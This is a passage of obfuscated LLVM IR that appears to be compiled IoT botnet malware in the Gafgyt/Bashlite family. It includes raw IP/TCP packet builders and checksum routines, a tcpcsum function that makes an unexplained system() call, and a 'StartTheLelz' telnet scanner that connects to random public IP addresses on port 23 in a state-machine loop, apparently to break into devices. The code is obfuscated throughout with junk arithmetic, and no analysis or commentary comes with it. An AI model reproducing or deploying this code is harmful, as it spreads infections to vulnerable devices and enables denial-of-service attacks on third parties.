  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 -717587208, -1
  %23 = or i32 %20, %21
  %24 = or i32 -717587208, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 -943724461, %28
  %30 = xor i32 -943724461, -1
  %31 = and i32 %11, %30
  %32 = xor i32 %26, -1
  %33 = and i32 %32, -943724461
  %34 = and i32 %26, %30
  %35 = or i32 %29, %31
  %36 = or i32 %33, %34
  %37 = xor i32 %35, %36
  %38 = xor i32 %11, %26
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub nsw i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %38

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %32
  %34 = sub i64 0, %31
  %35 = add i64 %33, %34
  %36 = sub i64 0, %35
  %37 = add i64 %32, %31
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %27, %24
  br label %39

; <label>:39:                                     ; preds = %43, %38
  %40 = load i64, i64* %5, align 8
  %41 = lshr i64 %40, 16
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %43, label %55

; <label>:43:                                     ; preds = %39
  %44 = load i64, i64* %5, align 8
  %45 = xor i64 65535, -1
  %46 = xor i64 %44, %45
  %47 = and i64 %46, %44
  %48 = and i64 %44, 65535
  %49 = load i64, i64* %5, align 8
  %50 = lshr i64 %49, 16
  %51 = sub i64 %47, 5407526139898012959
  %52 = add i64 %51, %50
  %53 = add i64 %52, 5407526139898012959
  %54 = add i64 %47, %50
  store i64 %53, i64* %5, align 8
  br label %39

; <label>:55:                                     ; preds = %39
  %56 = load i64, i64* %5, align 8
  %57 = xor i64 %56, -1
  %58 = and i64 -5613191429868929409, %57
  %59 = xor i64 -5613191429868929409, -1
  %60 = and i64 %56, %59
  %61 = xor i64 -1, -1
  %62 = and i64 %61, -5613191429868929409
  %63 = and i64 -1, %59
  %64 = or i64 %58, %60
  %65 = or i64 %62, %63
  %66 = xor i64 %64, %65
  %67 = xor i64 %56, -1
  %68 = trunc i64 %66 to i16
  ret i16 %68
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i32 0, i32 0))
  %43 = load i16*, i16** %8, align 8
  %44 = bitcast i16* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i16, i16* %9, align 2
  ret i16 %45
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 15, -1
  %26 = xor i8 %24, %25
  %27 = and i8 %26, %24
  %28 = and i8 %24, 15
  %29 = and i8 %27, 64
  %30 = xor i8 %27, 64
  %31 = or i8 %29, %30
  %32 = or i8 %27, 64
  store i8 %31, i8* %23, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 1
  store i8 0, i8* %34, align 1
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 20, -8638957960983019185
  %38 = add i64 %37, %36
  %39 = add i64 %38, -8638957960983019185
  %40 = add i64 20, %36
  %41 = trunc i64 %39 to i16
  %42 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %43 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %42, i32 0, i32 2
  store i16 %41, i16* %43, align 2
  %44 = call i32 @rand_cmwc()
  %45 = trunc i32 %44 to i16
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 3
  store i16 %45, i16* %47, align 4
  %48 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 4
  store i16 0, i16* %49, align 2
  %50 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %51 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %50, i32 0, i32 5
  store i8 -1, i8* %51, align 4
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 6
  store i8 %52, i8* %54, align 1
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 7
  store i16 0, i16* %56, align 2
  %57 = load i32, i32* %8, align 4
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 8
  store i32 %57, i32* %59, align 4
  %60 = load i32, i32* %7, align 4
  %61 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 9
  store i32 %60, i32* %62, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %61

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 0, 1
  %59 = sub i32 %57, %58
  %60 = add nsw i32 %57, 1
  store i32 %59, i32* %2, align 4
  br label %37

; <label>:61:                                     ; preds = %37
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

; <label>:64:                                     ; preds = %1134, %61
  br label %65

; <label>:65:                                     ; preds = %64
  store i32 0, i32* %2, align 4
  br label %66

; <label>:66:                                     ; preds = %1128, %65
  %67 = load i32, i32* %2, align 4
  %68 = load i32, i32* %1, align 4
  %69 = icmp slt i32 %67, %68
  br i1 %69, label %70, label %1134

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  switch i32 %76, label %1127 [
    i32 0, label %77
    i32 1, label %256
    i32 2, label %437
    i32 3, label %540
    i32 4, label %608
    i32 5, label %761
    i32 6, label %829
    i32 7, label %975
    i32 8, label %1003
  ]

; <label>:77:                                     ; preds = %70
  %78 = load i32, i32* %2, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 8
  %82 = load i8*, i8** %81, align 8
  call void @llvm.memset.p0i8.i64(i8* %82, i8 0, i64 1024, i32 1, i1 false)
  %83 = load i32, i32* %2, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 3
  %87 = load i8, i8* %86, align 1
  %88 = icmp ne i8 %87, 0
  br i1 %88, label %89, label %109

; <label>:89:                                     ; preds = %77
  %90 = load i32, i32* %2, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %91
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %92, i32 0, i32 8
  %94 = load i8*, i8** %93, align 8
  store i8* %94, i8** %11, align 8
  %95 = load i32, i32* %2, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %96
  %98 = bitcast %struct.telstate_t* %97 to i8*
  call void @llvm.memset.p0i8.i64(i8* %98, i8 0, i64 32, i32 16, i1 false)
  %99 = load i8*, i8** %11, align 8
  %100 = load i32, i32* %2, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %101
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %102, i32 0, i32 8
  store i8* %99, i8** %103, align 8
  %104 = call i32 @getRandomPublicIP()
  %105 = load i32, i32* %2, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 1
  store i32 %104, i32* %108, align 4
  br label %155

; <label>:109:                                    ; preds = %77
  %110 = load i32, i32* %2, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 5
  %114 = load i8, i8* %113, align 1
  %115 = sub i8 0, %114
  %116 = sub i8 0, 1
  %117 = add i8 %115, %116
  %118 = sub i8 0, %117
  %119 = add i8 %114, 1
  store i8 %118, i8* %113, align 1
  %120 = load i32, i32* %2, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 5
  %124 = load i8, i8* %123, align 1
  %125 = zext i8 %124 to i64
  %126 = icmp eq i64 %125, 26
  br i1 %126, label %127, label %141

; <label>:127:                                    ; preds = %109
  %128 = load i32, i32* %2, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 5
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* %2, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 4
  %136 = load i8, i8* %135, align 2
  %137 = add i8 %136, 111
  %138 = add i8 %137, 1
  %139 = sub i8 %138, 111
  %140 = add i8 %136, 1
  store i8 %139, i8* %135, align 2
  br label %141

; <label>:141:                                    ; preds = %127, %109
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = zext i8 %146 to i64
  %148 = icmp eq i64 %147, 19
  br i1 %148, label %149, label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 3
  store i8 1, i8* %153, align 1
  br label %1128

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %89
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext 23) #13
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %157, i16* %158, align 2
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %160 = getelementptr inbounds [8 x i8], [8 x i8]* %159, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 8, i32 4, i1 false)
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 1
  %165 = load i32, i32* %164, align 4
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  %168 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %169 = load i32, i32* %2, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 0
  store i32 %168, i32* %172, align 16
  %173 = load i32, i32* %2, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %174
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 16
  %178 = bitcast %struct.timeval* %10 to i8*
  %179 = call i32 @setsockopt(i32 %177, i32 1, i32 20, i8* %178, i32 16) #2
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 16
  %185 = bitcast %struct.timeval* %10 to i8*
  %186 = call i32 @setsockopt(i32 %184, i32 1, i32 21, i8* %185, i32 16) #2
  %187 = load i32, i32* %2, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %188
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 16
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %194

; <label>:193:                                    ; preds = %155
  br label %1128

; <label>:194:                                    ; preds = %155
  %195 = load i32, i32* %2, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 16
  %200 = load i32, i32* %2, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  %204 = load i32, i32* %203, align 16
  %205 = call i32 (i32, i32, ...) @fcntl(i32 %204, i32 3, i8* null)
  %206 = xor i32 %205, -1
  %207 = xor i32 2048, -1
  %208 = xor i32 1723473017, -1
  %209 = and i32 %206, 1723473017
  %210 = and i32 %205, %208
  %211 = and i32 %207, 1723473017
  %212 = and i32 2048, %208
  %213 = or i32 %209, %210
  %214 = or i32 %211, %212
  %215 = xor i32 %213, %214
  %216 = or i32 %206, %207
  %217 = xor i32 %216, -1
  %218 = or i32 1723473017, %208
  %219 = and i32 %217, %218
  %220 = or i32 %215, %219
  %221 = or i32 %205, 2048
  %222 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 4, i32 %220)
  %223 = load i32, i32* %2, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %229 = call i32 @connect(i32 %227, %struct.sockaddr* %228, i32 16)
  %230 = icmp eq i32 %229, -1
  br i1 %230, label %231, label %246

; <label>:231:                                    ; preds = %194
  %232 = call i32* @__errno_location() #13
  %233 = load i32, i32* %232, align 4
  %234 = icmp ne i32 %233, 115
  br i1 %234, label %235, label %246

; <label>:235:                                    ; preds = %231
  %236 = load i32, i32* %2, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 0
  %240 = load i32, i32* %239, align 16
  %241 = call i32 @sclose(i32 %240)
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 3
  store i8 1, i8* %245, align 1
  br label %255

; <label>:246:                                    ; preds = %231, %194
  %247 = load i32, i32* %2, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 2
  store i8 1, i8* %250, align 8
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 6
  store i32 0, i32* %254, align 4
  br label %255

; <label>:255:                                    ; preds = %246, %235
  br label %1127

; <label>:256:                                    ; preds = %70
  %257 = load i32, i32* %2, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %258
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %259, i32 0, i32 6
  %261 = load i32, i32* %260, align 4
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %263, label %269

; <label>:263:                                    ; preds = %256
  %264 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %265 = load i32, i32* %2, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 6
  store i32 %264, i32* %268, align 4
  br label %269

; <label>:269:                                    ; preds = %263, %256
  br label %270

; <label>:270:                                    ; preds = %269
  %271 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %271, i64 0, i64 0
  %273 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %272) #2, !srcloc !5
  %274 = extractvalue { i64, i64* } %273, 0
  %275 = extractvalue { i64, i64* } %273, 1
  %276 = trunc i64 %274 to i32
  store i32 %276, i32* %12, align 4
  %277 = ptrtoint i64* %275 to i64
  %278 = trunc i64 %277 to i32
  store i32 %278, i32* %13, align 4
  br label %279

; <label>:279:                                    ; preds = %270
  br label %280

; <label>:280:                                    ; preds = %279
  %281 = load i32, i32* %2, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %282
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 16
  %286 = srem i32 %285, 64
  %287 = zext i32 %286 to i64
  %288 = shl i64 1, %287
  %289 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = sdiv i32 %294, 64
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [16 x i64], [16 x i64]* %289, i64 0, i64 %296
  %298 = load i64, i64* %297, align 8
  %299 = xor i64 %298, -1
  %300 = xor i64 %288, -1
